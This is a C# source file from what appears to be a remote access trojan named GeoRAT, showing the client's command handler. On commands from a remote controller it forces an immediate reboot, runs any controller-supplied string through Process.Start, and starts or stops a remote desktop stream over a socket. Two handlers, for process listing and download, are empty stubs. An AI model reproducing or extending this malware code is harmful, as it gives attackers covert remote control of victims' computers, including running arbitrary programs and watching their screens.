using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.Remoting.Messaging;
using GeoRAT.Client.Core;
using GeoRAT.Client.Network.RemoteDesktop;
using GeoRAT.Core.Commands;


namespace GeoRAT.Client.CommandHandlers
{
   internal class CommandHandler
   {
        private RemoteDesktopService _desktop;
        public void Handle(Commands command,  Socket desktopSocket = null)
        {

            switch (command.CommandType)
            {
                case "Message":
                    Console.WriteLine("Message : " + Environment.NewLine);
                    Console.WriteLine("{0}", command.CommandParams + Environment.NewLine);
                    break;
                case "Disconnect":
                    Process.GetCurrentProcess().Kill();
                    break;
                case "Processes":
                    break;
                case "Restart":
                    Process.Start("shutdown", "/r /t 0");
                    break;
                case "OpenURL":
                    Console.WriteLine("Open website received, opening : {0}", command.CommandParams);
                    Process.Start(command.CommandParams);
                    break;
                case "Download":
                    break;
                case "Desktop":
                    Console.WriteLine("Remote desktop command received, sending desktop");
                    if (desktopSocket != null)
                    {
                        _desktop = new RemoteDesktopService(desktopSocket);
                        _desktop.StartSession();
                    }
                    break;
                case "Desktop_stop":
                     _desktop.StopSession();
                    break;
            }
        }


    }
}
